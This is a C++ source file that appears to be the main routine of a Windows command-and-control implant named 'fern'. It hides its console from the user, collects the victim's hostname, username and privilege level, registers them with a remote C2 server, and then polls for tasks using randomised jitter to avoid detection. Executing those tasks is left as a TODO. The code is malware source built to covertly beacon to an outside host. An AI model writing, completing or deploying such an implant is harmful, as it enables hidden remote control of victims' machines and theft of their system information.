#include <iostream>
#include <string>
#include <windows.h>
#include <random>
#include <format>
#include "shell.h"
#include "network_operations.h"
#include "agent.h"

int getRandom(int min, int max) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(min, max);
    return dis(gen);
}

std::vector<std::string> split_string(const std::string& s, const std::string& delimiter) {
    unsigned int position_start{0};
    unsigned int position_end{};
    unsigned long long delimiter_length{ delimiter.length() };
    std::string token;
    std::vector<std::string> res;

    while ((position_end = s.find(delimiter, position_start)) != std::string::npos) {
        token = s.substr(position_start, position_end - position_start);
        position_start = position_end + delimiter_length;
        res.push_back(token);
    }
    //last element in the list also needs to be pushed back, it doesnt meet the above condition,
    //because there are no more delimiters
    res.push_back(s.substr(position_start));
    return res;
}


int main() {
    //Hiding console from user
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    //Initializing agent
    agent fern;
    //register string, send to tell us that the agent is alive and working
    std::string reg {std::format("{},,{},,{}",fern.getHostname(), fern.getUsername(), fern.getPrivilege())};
    //TODO remove these later, commands should be taken from the C2 server


    std::string ip{fern.getip()};
    unsigned int port{fern.getport()};

    //Register agent on the server
    std::string regresponse {post(ip, port, REGISTER, reg)};

    //vector to hold tasks to execute
    std::vector<std::string> tasks;

    while (true) {
        int jitter = getRandom(-2500, 5000);

        if(regresponse.empty()){
            Sleep(500 + jitter);
            continue;
        }
        
        else {
            std::string response{get(ip, port, TASKS)};
            //TODO parse response, get tasks for our agent and execute them
            std::cout << response << "\n";
            tasks = split_string(response, ",,");
            Sleep(fern.getSleep() + jitter);
        }
    }
}
